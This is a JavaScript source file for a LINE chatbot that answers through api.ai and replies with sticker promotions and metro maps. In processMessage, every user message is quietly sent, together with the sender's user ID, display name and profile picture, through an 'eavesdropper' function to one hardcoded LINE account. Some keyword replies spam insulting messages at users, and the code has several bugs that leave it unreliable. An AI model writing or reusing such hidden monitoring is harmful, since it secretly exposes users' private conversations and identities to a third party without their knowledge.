'use strict';

const apiai = require('apiai');
const uuid = require('uuid');
const request = require('request');
const async = require('async');
const readline = require('readline');
const fs = require('fs');
const bnfunction = require('./bnFunction.js');
const bnreply = require('./bnReply.js');
const eroPicture = require('./eroPicture.js');
const eroFunction = require('./eroFunction.js');
let shutup = 0;

module.exports = class LineBot {

  get apiaiService() {
    return this._apiaiService;
  }

  set apiaiService(value) {
    this._apiaiService = value;
  }

  get botConfig() {
    return this._botConfig;
  }

  set botConfig(value) {
    this._botConfig = value;
  }

  get sessionIds() {
    return this._sessionIds;
  }

  set sessionIds(value) {
    this._sessionIds = value;
  }

  getText(message) {
    if (message.message && message.message.type === 'text'
        && message.message.text) {
      return message.message.text;
    } else{
        return null;
    }
  }

  getChatId(message) {
    if (message.source) {

      if (message.source.type === 'user') {
        return message.source.userId;
      }

      if (message.source.type === 'group') {
        return message.source.groupId;
      }

      if (message.source.type === 'room') {
        return message.source.roomId;
      }
    }
    return null;
  }

  constructor(botConfig) {
    this._botConfig = botConfig;
    let apiaiOptions = {
      language: botConfig.apiaiLang,
      requestSource: "line"
    };

    this._apiaiService = apiai(botConfig.apiaiAccessToken, apiaiOptions);
    this._sessionIds = new Map();
    this._sendMessageInterval = 500;
  }

  processMessage(message, res) {
    if (this._botConfig.devConfig) {
      this.log("message", message);
    }

    let chatId = this.getChatId(message);
    var messageText = this.getText(message);

    this.getProfile(chatId)
    .then((profiledata) => {
      // console.log(data);
      console.log('user says : ' + messageText);
      const data = JSON.parse(profiledata);
      const liyomessage = eroFunction.eavesdropper(data.userId, data.pictureUrl, data.displayName, messageText)
      this.replyPush('U506c7426ba192e705210a874b97b40ca',[liyomessage]);
    })



    if (chatId && messageText) {

      if (messageText) {
        if (!this._sessionIds.has(chatId)) {
          this._sessionIds.set(chatId, uuid.v4());
        }

        // ====================local check=============================
            if(res == null){
              console.log(err);
              console.log('event null');
            }
            if(res != null){
            this.PUBG(message,0).then((value) => {
              console.log(value);
                if(value == 0){
                  console.log("I'm in");
                  let apiaiRequest = this._apiaiService.textRequest(messageText,{
                  sessionId: this._sessionIds.get(chatId)
                });

                apiaiRequest.on('response', (response) => {

                let action = response.result.action;

                this.processAiResponse(chatId, response, message.replyToken)
                    .then(() => this.log('Message sent'))
                    .catch((err) => this.logError(err))
                });

                apiaiRequest.on('error', (error) => console.error(error));
                apiaiRequest.end();
              }else{
                console.log("Oh no");
                return this.reply(message.replyToken, [value]);
              }
            })
            .catch(err => console.log(err));
          }
        // });

        // mongo.eventLog(message,(err, res) => {
        //   console.log('event log');
        // });

      }
      else {
        this.log('Empty message 2 ');
      }
    } else {
            //return this.reply(message.replyToken, [confirm]);
      this.log('Empty message 3 ');
    }
  }
    // ====================================================================================================
  processPostback(postback,res){
        if (this._botConfig.devConfig) {
            this.log("message", postback);
        }

        let chatId = this.getChatId(postback);
        //let messageText = postback.postback.params.datetime;
        if (postback.type === 'follow'){  //點級圖片 換

          eroPicture.eroMenuList(this.botConfig.channelAccessToken,0)
          .then((richMenuId) => {
            eroPicture.linkUser(this.botConfig.channelAccessToken,"richmenu-6bc02a52c5f6f05347205b3588a00000",postback.source.userId);
          });


          return this.reply(postback.replyToken, [sticker]);
        }
        else if(postback.postback.data === "action=wrongphone"){
          const confirm = this.wrongphone(postback);
          return this.reply(postback.replyToken, [confirm]);
        }
        else if (postback.postback.data === "action=vertifyagain"){

          // mongo.findUser(postback.source.userId,(err, res) => {
          //   const status = res;
          //   var p = bnfunction.phoneSignupAPI(status.accessKey,status.BNuserid,status.phoneNumber);
          //   p.catch(err => console.log(err))
          // })
          const confirm = this.vertifyagain();
           // =======================================================fuck
          return this.reply(postback.replyToken, [confirm]);
        }else if (postback.postback.data === `action=one`){  //點級圖片 換

          eroPicture.eroMenuList(this.botConfig.channelAccessToken,0)
          .then((richMenuId) => {
            eroPicture.linkUser(this.botConfig.channelAccessToken,"richmenu-6bc02a52c5f6f05347205b3588a00000",postback.source.userId);
          });

          const sticker = {
            type: "sticker",
            packageId: "2",
            stickerId: "165"
          };
          return this.reply(postback.replyToken, [sticker]);
        }else if (postback.postback.data === `action=alpha`){  //點級圖片 換

          eroPicture.eroMenuList(this.botConfig.channelAccessToken,0)
          .then((richMenuId) => {
            eroPicture.linkUser(this.botConfig.channelAccessToken,"richmenu-6bc02a52c5f6f05347205b3588a00000",postback.source.userId);
          });

          const sticker = {
            type: "sticker",
            packageId: "2",
            stickerId: "155"
          };
          return this.reply(postback.replyToken, [sticker]);
        }
        const sticker = {
            type: "sticker",
            packageId: "2",
            stickerId: "164"
        };
        return this.reply(postback.replyToken, [sticker]);
  }
    // ====================================================================================================
  processAiResponse(chatId, apiaiResponse,replyToken) {
        let responseText = apiaiResponse.result.fulfillment.speech;
        let responseData = apiaiResponse.result.fulfillment.data;
        let messages = apiaiResponse.result.fulfillment.messages;
        let action = apiaiResponse.result.action;
        let result = apiaiResponse.result.fulfillment;
        console.log(action);
        console.log(result);
        let contexts = apiaiResponse.result.contexts;
        let parameters = apiaiResponse.result.parameters;

        if (this.isDefined(messages) && (messages.length == 1 && messages[0].type != 0 || messages.length > 1)) {
            console.log("first if");
            let timeoutInterval = 1100;
            let previousType ;
            let cardTypes = [];
            let timeout = 0;
            for (var i = 0; i < messages.length; i++) {

                previousType = messages[i].type;

            }
            const message = {
                type: "text",
                text: responseText
            };
            return this.reply(replyToken, [message]);
        } else if (responseText == '' && !this.isDefined(action)) {
            console.log("sec if");
            //api ai could not evaluate input.
            console.log('Unknown query' + apiaiResponse.result.resolvedQuery);
            const message = {
                type: "text",
                text: responseText
            };
            return this.reply(replyToken, [message]);

        } else if (this.isDefined(action)) {

            if (shutup == 0 ){
                console.log("deep wakeup");
                return this.handleApiAiAction(replyToken, action, responseText, contexts, messages);
            } else {
                const message = {
                    type: "text",
                    text: "shutdown bye~~"
                };
                return this.reply(replyToken, [message]);
            }
        } else if (this.isDefined(responseData) && this.isDefined(responseData.facebook)) {
          //no facebook
        } else if (this.isDefined(responseText)) {
            const message = {
                type: "text",
                text: responseText
            };
            return this.reply(replyToken, [message]);
        }
  }

    // ====================================================================================================

  handleApiAiAction(replyToken, action, responseText, contexts, messages) {
      console.log(action);
      const message = {
        type: "text",
        text: responseText
      };
      return this.reply(replyToken, [message]);
  }

  convertToLineMessages(responseMessages) {
    try {

      const lineMessages = [];

      for (let messageIndex = 0; messageIndex < responseMessages.length;
          messageIndex++) {
        let message = responseMessages[messageIndex];

        switch (message.type) {
          case 0:
            if (message.speech) {
              let lineMessage = {
                type: "text",
                text: message.speech
              };
              lineMessages.push(lineMessage);
            }
            break;
          case 1: {
            let lineMessage = {
              type: "template",
              altText: "Cards are not supported in this client",
              template: {
                type: "buttons"
              }
            };

            if (message.title) {
              lineMessage.template.title = message.title;
            }

            if (message.subtitle) {
              lineMessage.template.text = message.subtitle;
            } else {
              lineMessage.template.text = message.title;
              delete lineMessage.template.title;
            }

            if (message.imageUrl) {
              lineMessage.template.thumbnailImageUrl = message.imageUrl;
            }

            if (message.buttons.length > 0) {
              let actions = [];
              for (let buttonIndex = 0; buttonIndex < message.buttons.length;
                  buttonIndex++) {
                let button = message.buttons[buttonIndex];
                let text = button.text;
                let postback = button.postback;

                if (text) {

                  if (!postback) {
                    postback = text;
                  }

                  if (postback.startsWith('http')) {
                    actions.push({
                      type: "uri",
                      label: text,
                      uri: postback
                    });
                  } else {
                    actions.push({
                      type: "postback",
                      label: text,
                      data: postback,
                      text: postback
                    });
                  }
                }
              }

              if (actions.length > 0 && lineMessage.template.text) {
                lineMessage.template.actions = actions;
                lineMessages.push(lineMessage);
              }
            }
          }
            break;
          case 2: {
            let lineMessage = {
              type: "template",
              altText: "Cards are not supported in this client",
              template: {
                type: "buttons"
              }
            };
            lineMessage.template.text = message.title ? message.title
                : 'Choose an item';

            let actions = [];
            for (let replyIndex = 0; replyIndex < message.replies.length;
                replyIndex++) {
              let actionText = message.replies[replyIndex];
              actions.push({
                type: "postback",
                label: actionText,
                data: actionText,
                text: actionText
              });
            }

            if (actions.length > 0) {
              lineMessage.template.actions = actions;
              lineMessages.push(lineMessage);
            }
          }
            break;
          case 3: {
            if (message.imageUrl) {
              let lineMessage =
                  {
                    type: "image",
                    originalContentUrl: message.imageUrl,
                    previewImageUrl: message.imageUrl
                  };

              lineMessages.push(lineMessage);
            }
          }
            break;
          case 4:
            if (message.payload && message.payload.line) {
              lineMessages.push(message.payload.line);
            }
            break;
          default:
            break;
        }
      }

      return lineMessages;
    } catch (err) {
      return [];
    }
  }

  replyWithMessages(chatId, replyToken, lineMessages) {
    if (lineMessages && lineMessages.length > 0) {

      if (lineMessages.length <= 5) {
        // Line reply limit
        return this.reply(replyToken, lineMessages);
      } else {
        return new Promise((resolve, reject) => {
          async.eachSeries(lineMessages, (msg, callback) => {

            Promise.resolve()
                .then(() => this.replyPush(chatId, [msg]))
                .then(() => this.sleep(this._sendMessageInterval))
                .then(() => callback())
                .catch(err => callback(err));

          }, (err) => {
            if (err) {
              this.logError(err);
              reject(err);
            } else {
              resolve();
            }
          });
        });
      }
    } else {
      return Promise.resolve();
    }
  }

  reply(replyToken, messages) {
    console.log("reply in " + messages);
    return new Promise((resolve, reject) => {
      request.post("https://api.line.me/v2/bot/message/reply", {
        forever: true,
        headers: {
          'Authorization': `Bearer ${this.botConfig.channelAccessToken}`
        },
        json: {
          replyToken: replyToken,
          messages: messages
        }
      }, (error, response, body) => {
        if (error) {
          this.logError('Error while sending message', error);
          reject(error);
          return;
        }

        if (response.statusCode !== 200) {
          this.logError('Error status code while sending message', body);
          reject(error);
          return;
        }

        this.log('Send message succeeded');
        resolve(body);
      });
    });
  }

  replyPush(receiverId, messages) {
    console.log("liyo hack");
    return new Promise((resolve, reject) => {
      request.post("https://api.line.me/v2/bot/message/push", {
        forever: true,
        headers: {
          'Authorization': `Bearer ${this.botConfig.channelAccessToken}`
        },
        json: {
          to: receiverId,
          messages: messages
        }
      }, (error, response, body) => {
        if (error) {
          this.logError('Error while sending message', error);
          reject(error);
          return;
        }

        if (response.statusCode !== 200) {
          this.logError('Error status code while sending message', body);
          reject(error);
          return;
        }

        this.log('Send message succeeded');
        resolve(body);
      });
    });
  }

  getProfile(userid) {
    console.log("fuckin user =" + userid);
    return new Promise((resolve, reject) => {
      request.get(`https://api.line.me/v2/bot/profile/${userid}` , {
        headers: {
          'Authorization': `Bearer ${this.botConfig.channelAccessToken}`
        }
      }, (error, response, body) => {
        if (error) {
          this.logError('Error while sending message', error);
          reject(error);
          return;
        }

        if (response.statusCode !== 200) {
          this.logError('Error status code while sending message', body);
          reject(error);
          return;
        }

        this.log('Send message succeeded');
        resolve(body);
      });
    });
  }

  filterPlatformMessages(messages, platform) {
    if (messages) {
      let platformMessages = messages.filter(m => m.platform === platform);
      if (platformMessages.length === 0) {
        platformMessages = messages.filter(m => !this.isDefined(m.platform));
      }
      return platformMessages;
    } else {
      return [];
    }
  }

  sleep(delay) {
    return new Promise((resolve, reject) => {
      setTimeout(() => resolve(), delay);
    });
  }

  log() {
    let args = Array.prototype.slice.call(arguments);
    console.log.apply(console, args);
  }

  logError() {
    let args = Array.prototype.slice.call(arguments);
    console.error.apply(console, args);
  }

  isDefined(obj) {
    if (typeof obj === 'undefined') {
      return false;
    }

    if (!obj) {
      return false;
    }

    return obj !== null;
  }

  wrongphone(message){
    mongo.updateStatus(message.source.userId, 1, (err, res) => {
      if(err) console.log(err);
      else console.log(res);
    });

    return bnreply.askphonereply();
  }


  PUBG(message,status){
    //return Promise.resolve(0)
    if(message.message.text === "Cubee 安安"){
      const confirm = {
        type: "text",
        text: "這個功能晚點才會有喔"
      }; // end confirm
      const pushConfirm = {
        type: "text",
        text: "要不要先下載我們的貼圖阿 https://line.me/S/sticker/3998963"
      };
      this.replyPush(message.source.userId, [pushConfirm]);
      return Promise.resolve(confirm);
    }
    // sp
    if((message.message.text.indexOf('斂財') != -1)){
      const confirm = {
        type: "text",
        text: "給我花錢買貼圖 不夠就去賣屁股 "
      }; // end confirm
      const pushConfirm = {
        type: "text",
        text: "買我們的貼圖阿 窮逼垃圾  https://line.me/S/sticker/3998963"
      };
      this.replyPush(message.source.groupId | message.source.userId, [pushConfirm]);
      const pushConfirm1 = {
        type: "text",
        text: "買我們的貼圖阿 窮逼垃圾  https://line.me/S/sticker/4357617"
      };
      this.replyPush(message.source.groupId | message.source.userId, [pushConfirm1]);
      const pushConfirm2 = {
        type: "text",
        text: "買我們的貼圖阿 窮逼垃圾  https://line.me/S/sticker/3998963"
      };
      this.replyPush(message.source.groupId | message.source.userId, [pushConfirm2]);
      const pushConfirm3 = {
        type: "text",
        text: "買我們的貼圖阿 窮逼垃圾  https://line.me/S/sticker/4212262"
      };
      this.replyPush(message.source.groupId | message.source.userId, [pushConfirm3]);
      const pushConfirm4 = {
        type: "text",
        text: "買我們的貼圖阿 窮逼垃圾  https://line.me/S/sticker/4212262"
      };
      this.replyPush(message.source.groupId | message.source.userId, [pushConfirm4]);
      const pushConfirm5 = {
        type: "text",
        text: "買我們的貼圖阿 窮逼垃圾  https://line.me/S/sticker/3662781"
      };
      this.replyPush(message.source.groupId | message.source.userId, [pushConfirm5]);
      const pushConfirm6 = {
        type: "text",
        text: "買我們的貼圖阿 窮逼垃圾  https://line.me/S/sticker/4212408"
      };
      this.replyPush(message.source.groupId | message.source.userId, [pushConfirm6]);
      return Promise.resolve(confirm);
    }
    // sp==========
    if(message.message.text === "BlueNet功能 敬請期待" || message.message.text === "BN 測試 #####"){

      return Promise.resolve(eroFunction.chooseMenu());
    }else if(message.message.text === "查詢" ){
      const confirm = {
        type: "text",
        text: "your line userid = " + message.source.userId
      }; // end confirm
      return Promise.resolve(confirm);
    }else if( ((message.message.text.indexOf('台北') != -1) && (message.message.text.indexOf('捷運') != -1)) || (message.message.text.indexOf('北捷') != -1) ){
      const confirm = {
        "type": "image",
        "originalContentUrl": "https://web.metro.taipei/img/all/metrotaipeimap.jpg",
        "previewImageUrl": "https://web.metro.taipei/img/all/metrotaipeimap.jpg"
      }; // end confirm
      return Promise.resolve(confirm);
    }else if( ((message.message.text.indexOf('高雄') != -1) && (message.message.text.indexOf('捷運') != -1)) || (message.message.text.indexOf('高捷') != -1) ){
      const confirm = {
        "type": "image",
        "originalContentUrl": "https://www.tbkc.gov.tw/Upload/WebList/f88ff86c-9ca3-4832-a259-75001036bce8/Images/001.jpg",
        "previewImageUrl": "https://www.tbkc.gov.tw/Upload/WebList/f88ff86c-9ca3-4832-a259-75001036bce8/Images/001.jpg"
      }; // end confirm
      return Promise.resolve(confirm);
    }else if((message.message.text.indexOf('捷運') != -1)){
      const confirm = {
        "type": "template",
        "altText": "Ask MRT template",
        "template": {
            "type": "buttons",
            "thumbnailImageUrl": "https://www.bluenet-ride.com/images/drawable/cubeegroup/surprisecubee.png",
            "imageAspectRatio": "rectangle",
            "imageSize": "cover",
            "imageBackgroundColor": "#4898AF",
            "title": "搭捷運嗎 ?",
            "text": "您要台北捷運還是高雄捷運呢 ?",
            "defaultAction": {
                "type": "uri",
                "label": "View detail",
                "uri": "http://example.com/page/123"
            },
            "actions": [
                {
                  "type": "message",
                  "label": "北捷",
                  "text": "北捷"
                },
                {
                  "type": "message",
                  "label": "高捷",
                  "text": "高捷"
                }
            ]
        }
      }; // end confirm
      return Promise.resolve(confirm);
    }else if (message.message.text === "老鐵回家了"){
      return Promise.resolve(eroFunction.selftest());
    }else{
      return Promise.resolve(0);
    }
  }

  // rule(phone){
  //   var i,jd,phonetemp;

  //   phonetemp = "0123456789-+ ";
  //   if(phone.length == 10){
  //     if( (phone.charAt(0) + phone.charAt(1)) === "09" ){
  //       for (i = 0;i<phone.length;i++){
  //         jd = phonetemp.indexOf(phone.charAt(i));
  //         if(jd == -1)
  //           return 0;
  //       }
  //       return 1 ;
  //     }else{
  //       return 0 ;
  //     }
  //   }else{
  //     return 0 ;
  //   }
  // }
};